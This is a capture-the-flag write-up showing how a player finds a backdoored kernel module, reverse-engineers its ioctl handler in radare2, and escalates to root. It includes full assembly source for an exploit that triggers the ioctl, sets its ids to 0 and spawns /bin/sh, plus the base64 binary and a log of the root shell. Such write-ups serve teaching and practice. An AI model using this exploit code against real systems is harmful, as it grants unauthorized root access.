# Writeup [Gringotts Digitalization Project](README.md)

In this task the user is given a shell on a remote server. If we run `ls` we can see a file called `flag.txt`, however, it is only readably by root, not our user!

```
localhost:~$ ls -al flag.txt 
-r--------    1 root     root            28 Feb  3 13:01 flag.txt

```

The hints suggest that there may be something strange going on with the server, and 
that there may be a backdoor.

By executing `lsmod` on the server we can see that there is indeed an unusual module installed:
```
localhost:~$ lsmod
Module                  Size  Used by    Tainted: P  
pwn_module             16384  0 
```

We can use `find` to hopefully find the .ko-file of the module:
```
localhost:~$ find / -name \*.ko 2>/dev/null
/lib/modules/4.14.89-0-virt/kernel/kernel/pwn_module.ko
```

Since the server does not have any useful tools to analyse the file we have to exfiltrate it. Since there is no internet connection, and the file is reasonably small, we can base64-encode the file and simply copy-paste it over:

```
localhost:~$ base64 /lib/modules/4.14.89-0-virt/kernel/kernel/pwn_module.ko
f0VMRgIBAQAAAAAAAAAAAAEAPgABAAAAAAAAAAAAAAAAAAAAAAAAANAOAAAAAAAAAAAAAEAAAAAA
...snip...
AAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAAAADNAAAAAAAAAAAAAAAAAAAAAQAA
AAAAAAAAAAAAAAAAAA==
```

Once we have retrieved the file we can use `radare2` to analyze the binary:
```
$ r2 pwn.ko
Warning: Cannot initialize program headers
Warning: Cannot initialize dynamic strings
Warning: Cannot initialize dynamic section
Warning: run r2 with -e io.cache=true to fix relocations in disassembly
[0x080000b3]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x080000b3]> afl
0x08000064    4 79           sym.my_ioctl
0x080000b3    1 41           entry0
0x080000dc    1 18           sym.lkm_exit
```

It seems the only function of interest is `my_ioctl`, let's take a look:

```
[0x080000b3]> pdf @ sym.my_ioctl 
            ;-- section..text:
            ;-- section..text.unlikely:
/ (fcn) sym.my_ioctl 79
|   sym.my_ioctl (int arg2, int arg3);
|           ; arg int arg2 @ rsi
|           ; arg int arg3 @ rdx
|           0x08000064      55             push rbp                    ; [03] -r-x section size 79 named .text.unlikely
|           0x08000065      48c7c7000000.  mov rdi, 0                  ; RELOC 32  @ 0x080000ee + 0x0
|           0x0800006c      4889e5         mov rbp, rsp
|           0x0800006f      4154           push r12
|           0x08000071      4189f4         mov r12d, esi               ; arg2
|           0x08000074      53             push rbx
|           0x08000075      4889d3         mov rbx, rdx                ; arg3
(reloc.printk)
|           0x08000078      e800000000     call 0x800007d              ; RELOC 32 printk
|           ; CALL XREF from sym.my_ioctl (0x8000078)
|           0x0800007d      4181fc960700.  cmp r12d, 0x796             ; 1942
|       ,=< 0x08000084      7526           jne 0x80000ac
|       |   0x08000086      4881fbc80700.  cmp rbx, 0x7c8              ; 1992
|      ,==< 0x0800008d      751d           jne 0x80000ac
(reloc.prepare_creds)
|      ||   0x0800008f      e800000000     call 0x8000094              ; RELOC 32 prepare_creds
|      ||   ; CALL XREF from sym.my_ioctl (0x800008f)
|      ||   0x08000094      48c740040000.  mov qword [rax + 4], 0
|      ||   0x0800009c      4889c7         mov rdi, rax
|      ||   0x0800009f      48c740140000.  mov qword [rax + 0x14], 0
(reloc.commit_creds)
|      ||   0x080000a7      e800000000     call 0x80000ac              ; RELOC 32 commit_creds
|      ||   ; CALL XREFS from sym.my_ioctl (0x8000084, 0x800008d, 0x80000a7)
|      ``-> 0x080000ac      5b             pop rbx
|           0x080000ad      31c0           xor eax, eax
|           0x080000af      415c           pop r12
|           0x080000b1      5d             pop rbp
\           0x080000b2      c3             ret

```

r2 output shows that during the ioctl call arg2 (in r12d) is compared against 1942, and arg3 (in rbx) is also compared against 1992.
If this is the case, prepare_creds() and commit_creds() are called, which is a common way to get root on Linux systems from kernel space.

This `ioctl` probably has to be directed at a file the module creates. Radare2 is not able to automatically list the string arguments, but we can see a call to `proc_create` in the entry-function:
```
[0x080000b3]> pdf @ entry0 
            ;-- section..init.text:
            ;-- lkm_init:
            ;-- init_module:
            ;-- rip:
/ (fcn) entry0 41
|   entry0 ();
|           0x080000b3      55             push rbp                    ; [05] -r-x section size 41 named .init.text
|           0x080000b4      48c7c1000000.  mov rcx, 0                  ; RELOC 32  @ 0x08000380 + 0x0
|           0x080000bb      31d2           xor edx, edx
|           0x080000bd      beb6010000     mov esi, 0x1b6              ; 438
|           0x080000c2      48c7c7000000.  mov rdi, 0                  ; RELOC 32  @ 0x080000ee + 0x1a
|           0x080000c9      4889e5         mov rbp, rsp
(reloc.proc_create)
|           0x080000cc      e800000000     call 0x80000d1              ; RELOC 32 proc_create
|           ; CALL XREF from entry0 (0x80000cc)
|           0x080000d1      5d             pop rbp
|           0x080000d2      488905000000.  mov qword [0x080000d9], rax ; [0x80000d9:8]=0x3d8b4855c3c031 ; "1\xc0\xc3UH\x8b="; RELOC 32  @ 0x08000780 + 0xfffffffff7ffff27
|           ; DATA XREF from entry0 (0x80000d2)
|           0x080000d9      31c0           xor eax, eax
\           0x080000db      c3             ret
```

By listing the files in `/proc` we find one that catches our attention, `my_backdoor`:
```
localhost:~$ ls /proc
1              245            buddyinfo      kallsyms       partitions
10             267            bus            kcore          scsi
1032           272            cgroups        key-users      self
1040           3              cmdline        keys           slabinfo
1042           349            consoles       kmsg           softirqs
1050           4              cpuinfo        kpagecgroup    stat
11             405            crypto         kpagecount     swaps
12             446            devices        kpageflags     sys
13             459            diskstats      loadavg        sysrq-trigger
148            469            dma            locks          sysvipc
149            480            driver         meminfo        thread-self
15             481            execdomains    misc           timer_list
150            482            filesystems    modules        tty
152            5              fs             mounts         uptime
153            6              interrupts     mtrr           version
154            7              iomem          my_backdoor    vmallocinfo
156            8              ioports        net            vmstat
2              9              irq            pagetypeinfo   zoneinfo
```

Since the remote server does not have any useful tools we can build a small binary and copy it over:
```
[BITS 64]
global _start
_start:
    push	2
    pop		rax
    mov		rdi, path
    xor		rsi, rsi
    xor		rdx, rdx
    syscall

    mov		rdi, rax
    push	16
    pop		rax
    push	1992
    push	1942
    pop		rsi
    pop		rdx
    syscall

    ; setuid(0)
    push	105
    pop		rax
    xor		rdi, rdi
    syscall
    test	rax, rax
    jne		fail

    ; setgid(0)
    push	106
    pop		rax
    xor		rdi, rdi
    syscall

    push	0x68
    mov		rax, 0x732f2f2f6e69622f
    push	rax
    mov		rdi, rsp
    push	0x1010101 ^ 0x6873
    xor		dword [rsp], 0x1010101
    xor		esi, esi
    push	rsi
    push	8
    pop		rsi
    add		rsi, rsp
    push	rsi
    mov		rsi, rsp
    xor		edx, edx
    push	0x3b
    pop		rax
    syscall

    push	60
    pop		rax
    xor		rdi, rdi
    syscall

    fail:
    push	60
    pop		rax
    push	1
    pop		rdi
    syscall

path:
db "/proc/my_backdoor",0x00
shell:
db "/bin/sh",0x00
```

`$ nasm -felf64 pwn.S -o pwn.o && ld pwn.o -o pwn && strip pwn && base64 pwn`

Then we simply copy it over to the server and execute it:
```
$ cat << EOF | base64 -d > /tmp/lol
> f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAgABAAAAAAABAAAAAAAAAADABAAAAAAAAAAAAAEAAOAAB
> AEAAAwACAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGAEAAAAAAAAYAQAAAAAAAAAA
> IAAAAAAAAAAAAAAAAABqAlhIv/4AQAAAAAAASDH2SDHSDwVIicdqEFhoyAcAAGiWBwAAXloPBWpp
> WEgx/w8FSIXAdUBqalhIMf8PBWpoSLgvYmluLy8vc1BIiedocmkBAYE0JAEBAQEx9lZqCF5IAeZW
> SInmMdJqO1gPBWo8WEgx/w8FajxYagFfDwUvcHJvYy9teV9iYWNrZG9vcgAvYmluL3NoAAAuc2hz
> dHJ0YWIALnRleHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAQAAAAYAAAAAAAAAgABAAAAAAACAAAAAAAAA
> AJgAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA
> GAEAAAAAAAARAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==
> 
> EOF
localhost:/tmp$ ls
lol
localhost:/tmp$ chmod +x lol
localhost:/tmp$ ./lol
/tmp # id
uid=0(root) gid=0(root) groups=1000(hacker)
/ # cd home/hacker
/home/hacker # ls
flag.txt
/home/hacker # ls -lah
total 22
drwxr-sr-x    2 hacker   hacker      1.0K Feb  3 14:05 .
drwxr-xr-x    3 root     root        1.0K Feb  3 13:00 ..
-rw-------    1 hacker   hacker     17.7K Feb  8 08:36 .ash_history
-r--------    1 root     root          28 Feb  3 13:01 flag.txt
/home/hacker # cat flag.txt
TG19{IOCTLs are pure magic}
```
